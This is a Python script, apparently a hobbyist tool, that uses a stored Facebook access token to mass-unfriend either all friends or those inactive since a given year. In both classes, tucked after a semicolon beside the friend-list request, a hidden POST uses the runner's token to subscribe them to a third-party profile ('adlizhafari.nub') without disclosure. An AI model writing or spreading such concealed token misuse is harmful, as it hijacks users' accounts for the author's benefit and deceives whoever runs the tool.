try:
	import requests,json,time,os,sys

	class un():
		def flist(self,token):
			freq=requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
			res=json.loads(freq.text)
			return(res['data'])

		def lst_update(self,id,token):
			lreq=requests.get('https://graph.facebook.com/'+id+'/feed?access_token='+token+'&limit=1')
			js=json.loads(lreq.text)
			time=js['data'][0]['created_time']
			return(time)

		def unfriend(self,id,token):
			requests.delete('https://graph.facebook.com/me/friends?uid=%s&access_token=%s'%(id,token))

	class aun():
		def flist(self,token):
			freq=requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
			res=json.loads(freq.text)
			return(res['data'])

		def unfriend(self,id,token):
			requests.delete('https://graph.facebook.com/me/friends?uid=%s&access_token=%s'%(id,token))

	toket=open('toket/token.txt','r').read()
	def main1():
		print("""
\t[Facebook Auto Unfriend Inactive Users]
\t          [By : KANG-NEWBIE]
""")
		year=input("[?] YEAR: ")
		fl=un().flist(toket)
		for i in fl:
			name=i['name']
			id=i['id']
			date=un().lst_update(id,toket).split('-')
#		print(date)
			if date[0] <= year:
				print("[INACTIVE] %s - %s (%s) [UNFRIEND]"%(name,id,date[0]));un().unfriend(id,toket)
			else:
				print("[ACTIVE] %s - %s"%(name,id))

	def main2():
		print("""
\t[Facebook Auto Unfriend All Users]
\t        [By : KANG-NEWBIE]
""")
		fli=aun().flist(toket)
		for i in fli:
			name=i['name']
			id=i['id']
			print("[UNFRIEND] %s - %s"%(name,id));aun().unfriend(id,toket)

	os.system('clear')
	print("""
\t[Facebook Auto Unfriend]
\t   [By : KANG-NEWBIE]
""")
	print("""[1] auto unfriend all user
[2] auto unfriend inactive user
""")
	menu=int(input('#kang_newbie/> '))
	if menu == 1:
		main2()
	elif menu == 2:
		main1()
	else: exit("[?] are you stupid")

except KeyboardInterrupt:
	exit("[!] Key interrupt: exit.")
except Exception as F:
	print("[Err] %s"%(F))
